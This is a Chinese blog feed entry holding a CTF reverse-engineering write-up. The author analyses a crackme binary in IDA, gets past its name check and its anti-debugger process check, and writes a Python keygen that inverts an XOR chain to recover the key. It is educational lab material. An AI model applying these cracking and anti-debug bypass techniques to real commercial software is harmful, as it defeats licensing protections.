      <category term="整理笔记" scheme="http://fanxs-t.github.io/tags/%E6%95%B4%E7%90%86%E7%AC%94%E8%AE%B0/"/>
    
      <category term="二进制" scheme="http://fanxs-t.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>【Reverse】某CTF在线培训平台Reverse题</title>
    <link href="http://fanxs-t.github.io/2018/07/26/%E3%80%90Reverse%E3%80%91%E6%9F%90CTF%E5%9C%A8%E7%BA%BF%E5%9F%B9%E8%AE%AD%E5%B9%B3%E5%8F%B0Reverse%E9%A2%98/"/>
    <id>http://fanxs-t.github.io/2018/07/26/【Reverse】某CTF在线培训平台Reverse题/</id>
    <published>2018-07-26T02:34:56.000Z</published>
    <updated>2019-07-23T06:23:52.830Z</updated>
    
    <content type="html"><![CDATA[<p>这几天客户要参加一个CTF竞赛，据说是在一个CTF在线培训平台上抽题来做赛题，就让我们把题做了之后给他们培训CTF。这个平台里只有一道reverse的题，名字还是取了最近特别火的电影“我不是药神”之名（这电影巨好看，业界良心），这几天虽然忙着测一个智能设备，但还是抽出时间想来试试这道reverse题。</p><h2 id="0x00-初探"><a href="#0x00-初探" class="headerlink" title="0x00. 初探"></a>0x00. 初探</h2><p><img src="http://148.70.228.11/bc3b06317e6bad96fa80f27900419bef.png" alt="题目"><br>这道题为一个EXE文件，打开后需要输入名字和key来通关，如果输错了，则会“爆炸”。迫不及待打开了exe，瞎填了名字和key，想看看报错的语句是什么（方便后来ida里寻找）。</p><p>刚输完名字，程序就关掉了……看来是只有输入了固定的名字，才能走到输入key那一步。好吧，那就直接IDA上吧。</p><h2 id="0x01-IDA起！找名字！"><a href="#0x01-IDA起！找名字！" class="headerlink" title="0x01. IDA起！找名字！"></a>0x01. IDA起！找名字！</h2><p>IDA挂上exe，先来静态分析。打开String窗口，看了一圈发现了明显的输出字段：<br><img src="http://148.70.228.11/7b4be4eab1b09fcfd9b7418b444f1eb2.png" alt=""><br>    直接跳到相关函数处：<br><img src="http://148.70.228.11/23f6f1d23f59a5d75d428c6daad6b732.png" alt=""><br>这里截取了对名字判断的部分，直接F5看伪代码。这里的consolePrint，stringInit，getInput函数都是我分析了函数功能后加上的重命名。分析中间的循环体，可见对我们输入的name字段和“nsfocus”字符串一位一位作对比，若两个字符串存在不同之处，则break跳出循环，将结果nameFilterResult设置为1，输出“No Auth”后结束进程。显然，合理的名字就只有“nsfocus”了。</p><p>那我们给输入”nsfocus”继续往下走:<br><img src="http://148.70.228.11/774df09ad212f1e638b181e85b3f3f4b.png" alt=""><br>阔以了~终于让我们走到第二部输入key了，赶紧输一个试试……<br><img src="http://148.70.228.11/62d692d894f0d524c882ca41c9d2c3f7.png" alt=""><br>？？？？？？？？？？？？？？？<br>就这样在目瞪口呆中，虚拟机被关掉了。。。日诶<br>（ 这就是传说中的爆炸吗 Orz…</p><h2 id="0x02-IDA跑！找key啊喂"><a href="#0x02-IDA跑！找key啊喂" class="headerlink" title="0x02. IDA跑！找key啊喂"></a>0x02. IDA跑！找key啊喂</h2><p>没有一点点防备，也没有一丝顾虑，你就这样关机……为了防止关机，我另起了一个cmd，专门执行shutdown.exe -a来停止关机……（醉 눈_눈</p><p>key判断的部分茫茫地长。。<br><img src="http://148.70.228.11/5c7d124c3eb14e2955f3e7e4c83c8e67.png" alt=""><br><img src="http://148.70.228.11/127684a6939519ac3f34969f4dfd609d.png" alt=""><br><img src="http://148.70.228.11/f7e107835b8fae76564901e5d43a7218.png" alt=""></p><p>从结果往上推，可见我们需要的是“Congratulation..”的那个结果，要求sub_402BE0函数的返回结果必须为True。这个函数用到了3个参数，<font color="#FF4040">v34, key, v48-v19 </font>。</p><p>那我们先从key入手。可见在中间位置，有对key重新赋值的一个循环：<br><img src="http://148.70.228.11/17b9887eee3e15c4af365333028a9232.png" alt=""><br>第一个do while循环，用v57取出key里的字符，若字符不为空，则v51指针++，取下一个字符。可见此循环意在将v51推到key的结尾，循环结束时，v51的位置为key的终结符后一位。</p><p>因此，for循环的第一个参数 v51-v26-1，则是算出了key的长度了（其实严格来说是 length – 1），将这个值给参数i初始化，之后取出 v24 = key[i]，再–i，可见是由尾部向头部取出key的值，再执行以下关键操作：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key[i] ^= string[v50 - v24 - 1 - i]^dword_41E378 ^*(&amp;predefinedKey + i % 7)</span><br></pre></td></tr></table></figure></p><p>第一部分即为string[ length – 1 – i]，从头开始取出string的值，string[0],string[1],string[2]……dword_41E378则会被每次的计算结果所重新赋值。第三部分，可看到这是个字符数组predefindedKey[7] = “nomoney”，取出i%7位置的值，如果 i为7，则在这个数组里取出”n”，若i为8，则取出”o”，以此类推。</p><p>这个循环可初步判断为这道题的关键点，用python可模拟为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">predefinedKey = [110,111,109,111,110,101,121]     # nomoney</span><br><span class="line">length = len(key)</span><br><span class="line">for i in range(length-1, 0 ,-1):</span><br><span class="line">    key[i] = key[i] ^ string[length-1-i] ^ dword ^ predefinedKey[i%7]</span><br><span class="line">    dword = key[i]</span><br></pre></td></tr></table></figure></p><p>所以，要掌握key值转换后的值，我们还需要知道 dword 和 string的值。至此，key就先分析到这。</p><h2 id="0x03-关键函数sub-402BE0"><a href="#0x03-关键函数sub-402BE0" class="headerlink" title="0x03. 关键函数sub_402BE0"></a>0x03. 关键函数sub_402BE0</h2><p>做出最后结果的函数sub_402BE0的伪代码是：<br><img src="http://148.70.228.11/f9cd82bcf5aa3e8046be2705379ace12.png" alt=""><br>这里的伪代码有点乱七八糟的，看起来不明所以。直接看汇编：<br><img src="http://148.70.228.11/4f59a561d4023869d8b7228ed508265f.png" alt=""><br>这里sub_402BE0函数传的参分别对应ecx,edx,edi，edx即为key。红色框住的部分为函数的主要判断，从汇编代码中我们可一目了然地看到，主体部分在不断地从ecx和edx两个寄存器指向的内存地址中取出字符一位一位做对比，若存在不同之处，则返回失败。根据这段汇编代码，我们可初步猜测，这个函数为key和题目中暗藏的最后的密文做对比，若相同，则返回成功，同时也以此推断，第三个参数edi可能为key的长度。</p><p>(PS: 所以很多时候还是看汇编靠谱啊…就是看的头疼了一点</p><h2 id="0x04-是时候让IDA跑起来了！"><a href="#0x04-是时候让IDA跑起来了！" class="headerlink" title="0x04. 是时候让IDA跑起来了！"></a>0x04. 是时候让IDA跑起来了！</h2><p>静态分析得差不多了，走向最终胜利的流程图已分析出来，剩下的就是把我们还未解决的几个参数搞清楚。</p><p>至此，走向胜利还需要知道几个参数的值：</p><ol><li>dword — 修改key</li><li>string — 修改key</li><li>v48-v19 –函数sub_402BE0参数，猜测为长度</li><li>v34 –函数sub_402BE0参数，猜测为最后的密文</li></ol><p>dword位于bss区，程序在跑起来时会在某个函数处赋予它初值。静态分析扫了一下代码，发现生成或影响 string / v34参数值都没有用到Key参数，说明它们是独立于我们的输入的，应该为一个定值。</p><p>那我们先跑起来~<br><img src="http://148.70.228.11/0cc3c0a978339f1487ba034a42470689.png" alt=""><br>挂上debugger后，跑一下….诶？首长，它自杀了。。。进程自己关掉了，啥情况？？？<br>再细细排查了一下，发现一个神奇的函数：<br><img src="http://148.70.228.11/9b2f04be5cf1ae3cb49bcb0117a26542.png" alt=""><br><img src="http://148.70.228.11/04288e66881cf1af309a56582b6c5d12.png" alt=""><br>原来这还有一个坑，启动程序时检查进程里是否存在peid,idaq,ollydbg等进程，如果存在则退出进程。</p><p>好吧，那我就把idaq改个名，就。。好了눈_눈</p><p>终于跑起来了，我们通过动态调试，让程序自己生成我们想要的几个参数的值:<br><img src="http://148.70.228.11/388315f7b2d064688a04a3649e02cc09.png" alt=""><br>打几个断点，记录下我们需要的值，可知</p><p><strong>dword</strong>的初始值为 2</p><p><strong>string</strong> 的值为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x62,0x39,0x62,0x37,0x64,0x64,0x31,0x63,0x34,0x32,0x31,0x65,0x30,0x30,0x35,0x62,0x63,0x39,0x61,0x37,0x66,0x37,0x30,0x62,0x38,0x34,0x38,0x65,0x33,0x64,0x30,0x65</span><br></pre></td></tr></table></figure></p><p><img src="http://148.70.228.11/cc04008fa734a9e4fe8c44eac7c92e25.png" alt=""><br>在sub_402BE0函数里打断点，看到我们最后要的密文<strong>ciphertext</strong>为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x51,0x3C,0x0f,0x67,0x5c,0x2c,0x41,0x53,0x6a,0x49,0x70,0x51,0x68,0x54,0x2b,0x23,0x5b,0x64,0x0e,0x60,0x6a,0x43,0x69,0x46,0x69,0x0c,0x25,0x41,0x72,0x44,0x16,0x72</span><br></pre></td></tr></table></figure></p><p>同时也在函数中确认了第三个参数的确为Key的长度。再多重新跑程序输入不同的key值，动态调试中发现string,dword和ciphertext并没有改变，说明之前分析出来的结论，它们的值与输入独立不相关是正确的。</p><p>至此我们离胜利只有一步之遥。</p><h2 id="0x05-胜利"><a href="#0x05-胜利" class="headerlink" title="0x05. 胜利"></a>0x05. 胜利</h2><p>总结一下，这个程序先对name做判断，若不为nsfocus，则退出进程。</p><p>运行时，通过几个函数生成string 和最后的ciphertext （不是个constant string），并和输入的key进行异或和重新赋值。这个重新赋值的过程类似于CBC (Cipher Block Chaining ):</p><p>输入key为”ABCDEFGHIJK”时，得到key变换过程：<br><img src="http://148.70.228.11/107b69da56dbac86a4769fdf3b20322e.png" alt=""><br>这类似于CBC block加密的方法即是这里Key的转换过程。为了拿到flag,我们需要一个能转换为指定的ciphertext的一个key值，即根据ciphertext,由以上的类CBC加密结构，解密出key的值。</p><p>这里用一个python脚本来进行计算：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nomoney的循环字符串</span></span><br><span class="line">predefinedKey = [<span class="number">0x6e</span>,<span class="number">0x6f</span>,<span class="number">0x6d</span>,<span class="number">0x6f</span>,<span class="number">0x6e</span>,<span class="number">0x65</span>,<span class="number">0x79</span>,<span class="number">0x6e</span>,<span class="number">0x6f</span>,<span class="number">0x6d</span>,<span class="number">0x6f</span>,<span class="number">0x6e</span>,<span class="number">0x65</span>,<span class="number">0x79</span>,<span class="number">0x6e</span>,<span class="number">0x6f</span>,<span class="number">0x6d</span>,<span class="number">0x6f</span>,<span class="number">0x6e</span>,<span class="number">0x65</span>,<span class="number">0x79</span>,<span class="number">0x6e</span>,<span class="number">0x6f</span>,<span class="number">0x6d</span>,<span class="number">0x6f</span>,<span class="number">0x6e</span>,<span class="number">0x65</span>,<span class="number">0x79</span>,<span class="number">0x6e</span>,<span class="number">0x6f</span>,<span class="number">0x6d</span>,<span class="number">0x6f</span>]</span><br><span class="line"><span class="comment"># string</span></span><br><span class="line">string = [<span class="number">0x62</span>,<span class="number">0x39</span>,<span class="number">0x62</span>,<span class="number">0x37</span>,<span class="number">0x64</span>,<span class="number">0x64</span>,<span class="number">0x31</span>,<span class="number">0x63</span>,<span class="number">0x34</span>,<span class="number">0x32</span>,<span class="number">0x31</span>,<span class="number">0x65</span>,<span class="number">0x30</span>,<span class="number">0x30</span>,<span class="number">0x35</span>,<span class="number">0x62</span>,<span class="number">0x63</span>,<span class="number">0x39</span>,<span class="number">0x61</span>,<span class="number">0x37</span>,<span class="number">0x66</span>,<span class="number">0x37</span>,<span class="number">0x30</span>,<span class="number">0x62</span>,<span class="number">0x38</span>,<span class="number">0x34</span>,<span class="number">0x38</span>,<span class="number">0x65</span>,<span class="number">0x33</span>,<span class="number">0x64</span>,<span class="number">0x30</span>,<span class="number">0x65</span>]</span><br><span class="line"><span class="comment"># 将nomoney和string做预先的xor结果</span></span><br><span class="line">string2 = [predefinedKey[-(i+<span class="number">1</span>)]^string[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(predefinedKey))]</span><br><span class="line"><span class="comment"># 最后要的密文</span></span><br><span class="line">ciphertext = [<span class="number">0x51</span>,<span class="number">0x3C</span>,<span class="number">0x0f</span>,<span class="number">0x67</span>,<span class="number">0x5c</span>,<span class="number">0x2c</span>,<span class="number">0x41</span>,<span class="number">0x53</span>,<span class="number">0x6a</span>,<span class="number">0x49</span>,<span class="number">0x70</span>,<span class="number">0x51</span>,<span class="number">0x68</span>,<span class="number">0x54</span>,<span class="number">0x2b</span>,<span class="number">0x23</span>,<span class="number">0x5b</span>,<span class="number">0x64</span>,<span class="number">0x0e</span>,<span class="number">0x60</span>,<span class="number">0x6a</span>,<span class="number">0x43</span>,<span class="number">0x69</span>,<span class="number">0x46</span>,<span class="number">0x69</span>,<span class="number">0x0c</span>,<span class="number">0x25</span>,<span class="number">0x41</span>,<span class="number">0x72</span>,<span class="number">0x44</span>,<span class="number">0x16</span>,<span class="number">0x72</span>]</span><br><span class="line"> </span><br><span class="line">result = []</span><br><span class="line">dword = <span class="number">0x02</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(ciphertext)):</span><br><span class="line">r = string2[i] ^ ciphertext[-(i+<span class="number">1</span>)] ^ dword</span><br><span class="line">dword = ciphertext[-(i+<span class="number">1</span>)]</span><br><span class="line">result.append(chr(r))</span><br><span class="line"> </span><br><span class="line">key = <span class="string">''</span>.join(result)</span><br><span class="line">key = key[::<span class="number">-1</span>]</span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure></p><p>这样就可以算出了最后的结果：<br><img src="http://148.70.228.11/774df09ad212f1e638b181e85b3f3f4b.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这几天客户要参加一个CTF竞赛，据说是在一个CTF在线培训平台上抽题来做赛题，就让我们把题做了之后给他们培训CTF。这个平台里只有一道reverse的题，名字还是取了最近特别火的电影“我不是药神”之名（这电影巨好看，业界良心），这几天虽然忙着测一个智能设备，但还是抽出时间想
      
    
    </summary>
    
      <category term="CTF" scheme="http://fanxs-t.github.io/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://fanxs-t.github.io/tags/CTF/"/>
    
      <category term="逆向" scheme="http://fanxs-t.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
</feed>
